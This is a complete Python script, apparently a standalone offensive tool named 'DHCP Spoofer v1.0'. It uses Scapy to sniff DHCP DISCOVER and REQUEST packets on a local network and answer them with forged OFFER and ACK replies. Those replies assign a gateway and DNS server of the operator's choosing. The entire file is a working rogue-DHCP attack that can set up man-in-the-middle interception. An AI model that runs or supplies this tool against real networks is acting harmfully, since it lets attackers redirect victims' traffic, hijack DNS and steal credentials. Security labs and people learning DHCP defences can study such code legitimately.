#! /usr/bin/python3

from scapy.all import DHCP, BOOTP, Ether, IP, UDP, sniff, sendp, get_if_hwaddr, get_if_addr
import argparse
import ipaddress
import random

# Colors
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"
BOLD = "\033[1m"

def banner():
    print(f"""
    {CYAN}{BOLD}
╭──────────────────────────────────────────╮
│            DHCP Spoofer v1.0             │
╰──────────────────────────────────────────╯
    {RESET}""")

def build_dhcp_ack(iface, client_mac, client_chaddr, dhcp_transaction_id, requested_ip, subnetmask, gateway, dns):
	server_mac = get_if_hwaddr(iface)
	server_ip = get_if_addr(iface)
	
	# Generating DHCP ACK packet
	dhcp_ack = (
		Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff")/
		IP(src=server_ip, dst="255.255.255.255")/
		UDP(sport=67, dport=68)/
		BOOTP(op=2, xid=dhcp_transaction_id, yiaddr=requested_ip, siaddr=server_ip, chaddr=client_chaddr)/
		DHCP(options=[
			("message-type", "ack"),
			("server_id", server_ip),
			("subnet_mask", subnetmask),
			("router", gateway),
			("name_server", dns),
			("lease_time", 86400),
			"end"])
	)
	
	print(f"{GREEN}[+] DHCP ACK: {RESET}{requested_ip} -> {client_mac}")
	
	sendp(dhcp_ack, iface=iface, verbose=False)

def build_dhcp_offer(iface, client_mac, client_chaddr ,dhcp_transaction_id, offered_ip, subnetmask, gateway, dns):
	server_mac = get_if_hwaddr(iface)
	server_ip = get_if_addr(iface)

	# Generating DHCP OFFER packet
	dhcp_offer = (
		Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff")/
		IP(src=server_ip, dst="255.255.255.255")/
		UDP(sport=67, dport=68)/
		BOOTP(op=2, xid=dhcp_transaction_id, yiaddr=offered_ip, siaddr=server_ip, chaddr=client_chaddr)/
		DHCP(options=[
			("message-type", "offer"),
			("server_id", server_ip),
			("subnet_mask", subnetmask),
			("router", gateway),
			("name_server", dns),
			("lease_time", 86400),
			"end"])
	)

	print(f"{GREEN}[+] DHCP OFFER: {RESET}{offered_ip} -> {client_mac}")
	sendp(dhcp_offer, iface=iface, verbose=False)

def packet_handler(packet, iface, offered_ip, subnetmask, gateway, dns):
	# Ensure it's a DHCP packet containing BOOTP
	if not packet.haslayer(DHCP) or not packet.haslayer(BOOTP):
		return
		
	# Extract the DHCP message type
	dhcp_message_type = None
	requested_ip = None
	server_identifier = None

	for option in packet[DHCP].options:
		if not isinstance(option, tuple):
			continue

		if option[0] == "message-type":
			dhcp_message_type = option[1]
		elif option[0] == "requested_addr":
			requested_ip = option[1]
		elif option[0] == "server_id":
			server_identifier = option[1]

	if dhcp_message_type is None:
		return

	# Get DHCP information
	dhcp_transaction_id = packet[BOOTP].xid
	client_mac = packet[Ether].src
	client_chaddr = packet[BOOTP].chaddr

	# Check if this is a DHCP DISCOVER packet (1:Discover 2:Offer, 3:Request, 4:Decline, 5:ACK, 6:NAK, 7:Release, 8:Inform)
	if dhcp_message_type == 1:
		print(f"{YELLOW}[+] DHCP DISCOVER received from {RESET}{client_mac}")
		# Generating DHCP OFFER packet
		build_dhcp_offer(iface, client_mac, client_chaddr, dhcp_transaction_id, offered_ip, subnetmask, gateway, dns)
	elif dhcp_message_type == 3:
		print(f"{YELLOW}[+] DHCP REQUEST received from {RESET}{client_mac}")

		# If the client didn't specify an address, use the address we offered.
		if requested_ip is None:
			requested_ip = offered_ip

		# If the client explicitly selected another DHCP server, this request isn't for us.
		if server_identifier is not None and server_identifier != get_if_addr(iface):
			return
		# Generating DHCP ACK packet
		build_dhcp_ack(iface, client_mac, client_chaddr, dhcp_transaction_id, requested_ip, subnetmask, gateway, dns)

def packet_sniffer(iface, offered_ip, subnetmask, gateway, dns):
	print(f"{CYAN}[•] Sniffing DHCP packets...\n{RESET}")
	# Use prn= inside sniff() to process each packet as it's captured.
	# Use store=False in sniff() to avoid storing packets in memory unnecessarily.
	# sniff() only allows prn to be a function that takes one argument: the packet. To work around this, you can use a lambda function to pass additional arguments to your packet handler.
	# udp and (port 67 or 68): Sniff all DHCP packets
	sniff(iface=iface, filter="udp and (port 67 or 68)", prn=lambda packet: packet_handler(packet, iface, offered_ip, subnetmask, gateway, dns), store=False)

def network_calculation(cidr):
	# Define a network using CIDR notation
	network = ipaddress.IPv4Network(cidr, strict=False)

	# Getting the subnetmask
	subnetmask = network.netmask

	# Get all usable hosts (excludes network and broadcast)
	hosts = list(network.hosts())
	
	if not hosts:
		raise ValueError(f"[x] No usable host addresses in network: {cidr}")

	# Pick a random IP address
	random_ip = random.choice(hosts)

	return str(subnetmask), str(random_ip)

def main():
	# Create an argument parser
	# ArgumentDefaultsHelpFormatter ensures default values are shown in the help text
	parser = argparse.ArgumentParser(description="Simple DHCP spoofing with Scapy", formatter_class=argparse.ArgumentDefaultsHelpFormatter)

	# Define the command-line arguments
	parser.add_argument("-i", "--iface", metavar="", default="eth0", help="Network interface")
	parser.add_argument("-g", "--gateway", metavar="", default="192.168.1.1", help="Network gateway")
	parser.add_argument("-n", "--dns", metavar="", default="192.168.1.1", help="Network DNS server")
	parser.add_argument("-r", "--range", metavar="", default="192.168.1.0/24", help="Network IP address range")

	# Parse and use the arguments
	args = parser.parse_args()

	# Get the subnet mask from CIDR notation and generate a random IP address
	subnetmask, offered_ipaddr = network_calculation(args.range)

	# Print banner
	banner()

	print("[*] DHCP Configuration")
	print(f"[+] Network: {args.range}")
	print(f"[+] Subnet mask: {subnetmask}")
	print(f"[+] Gateway: {args.gateway}")
	print(f"[+] DNS: {args.dns}")
	print(f"[+] Random IP address: {offered_ipaddr}")
	print()

	# Sniff DHCP packets
	packet_sniffer(args.iface, offered_ipaddr, subnetmask, args.gateway, args.dns)

main()